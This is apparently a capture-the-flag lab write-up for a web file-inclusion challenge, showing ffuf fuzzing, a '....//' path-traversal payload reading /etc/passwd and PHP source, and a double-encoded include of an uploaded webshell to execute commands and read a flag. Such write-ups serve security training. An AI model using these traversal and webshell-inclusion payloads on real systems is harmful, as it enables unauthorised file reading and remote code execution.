
## Scenario

You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.

<img src="/budahacksecurity_static/uploads/md_images/file_inclusion/f.png" style="max-width:100%; border-radius:8px;">


Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.


We can see that this allows us to obtain the flag located in the `/root` directory.

#### Enumeration the LFI

We can see that we found an API endpoint related to image handling at `/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c`.  
By fuzzing this endpoint, we discovered a payload that, when executed with `curl`, allows us to obtain an LFI vulnerability.

```rust
~/Escritorio/htb via 🐘 v8.4.16 
❯ ffuf -ic -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.120.119:35767/api/image.php?p=FUZZ' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://94.237.120.119:35767/api/image.php?p=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________


....//....//....//....//etc/passwd [Status:200, Size:1041, Words:7, Lines:22, Duration: 154ms]

```


Executing with curl 

```bash
 curl -s  'http://94.237.120.119:35767/api/image.php?p=....//....//....//....//etc/passwd'                                                                                             
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
```


#### Explotation

Now that we know this, we proceed to exploit the vulnerability to obtain RCE.

We found in `application.php` that the uploaded file is stored in the `../uploads/` directory using an MD5-based filename.

```bash
curl  'http://94.237.56.175:57867/api/image.php?p=....//api/application.php'
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>%     
```

We uploaded the `shell.php` file and calculated its MD5 hash.

```bash
 md5sum shell.php                
fc023fcacb27a7ad72d605c4e300b389  shell.php
```

In `contact.php`, we identified a potential RCE vulnerability due to the dynamic file inclusion based on the `region` parameter.

payload:

```bash
❯ curl  'http://94.237.56.175:57867/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/flag_09ebca.txt'
```

We obtained the flag